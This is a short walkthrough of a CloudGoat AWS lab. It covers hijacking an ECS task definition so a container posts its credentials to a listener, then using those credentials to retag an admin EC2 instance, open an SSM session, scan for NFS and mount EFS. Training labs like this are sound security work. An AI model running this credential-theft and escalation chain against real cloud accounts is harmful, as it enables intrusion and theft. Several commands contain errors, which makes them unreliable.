Connect to the start ec2 "Ruse_Box" using the public IP and SSH key provided.

`ssh -i cloudgoat ubuntu@<IP ADDRESS>`

Configure the role crednetials 
`aws configure --profile ruse`

List the privlages 
`aws iam list --profile ruse`

List ec2 instances 
`aws ec2 describe-instances --profile ruse `

List all available ecs clusters 
`aws ecs list-clusters --profile ruse`

List services in cloudgoat cluster
`aws ecs list-services --cluster <CLUSTER ARN> --profile ruse`

Download task definition 
`aws ecs describe-task-definition --task-definition <TASK_NAME>:<VERSION> --profile ruse > task_def.json `

Download template to register a new task
`aws ecs register-task-definition --generate-cli-skeleton --profile ruse > task_template.json`

Now use task_def.json to fillout template.json with the desired payload. Reference our blog for details [here](https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/)

Now register the tempate to repalce the current running task.
`register-task-definition --cli-input-json file://task_template.json  --profile ruse`

Wait for task to run and POST the credentiuals to your listener

With the new creds add them to "ruse_box"
`aws configure --profile ecs`

Modify admin ec2 tags
`aws ec2 create-tags --resources <INSTANCE ID> --tags Key=StartSession,Value=true`

Using ecs creds start a session on admin ec2 
`aws ssm start-session --target <INSTANCE ID> --profile ecs`

Looking at the ec2 instances we see the admin ec2 only has a single port open. We Nmap scan this port.
`nmap -Pn -P 2049 --open 10.10.10.0/24 `

Mount discovered ec2 
`cd /mnt`
`sudo mkdir /efs`
`sudo mount -t nfs4 -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <IP ADDRESS OF EFS>:/ efs`